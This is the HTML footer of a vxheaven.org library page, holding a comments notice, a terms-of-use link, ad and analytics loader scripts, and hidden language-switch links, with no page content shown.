<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vjw00">de</a><a href="/lib/index.php?lang=en&amp;id=vjw00">en</a><a href="/lib/index.php?lang=es&amp;id=vjw00">es</a><a href="/lib/index.php?lang=it&amp;id=vjw00">it</a><a href="/lib/index.php?lang=fr&amp;id=vjw00">fr</a><a href="/lib/index.php?lang=pl&amp;id=vjw00">pl</a><a href="/lib/index.php?lang=ru&amp;id=vjw00">ru</a><a href="/lib/index.php?lang=ua&amp;id=vjw00">ua</a></div>
</body>
</html>
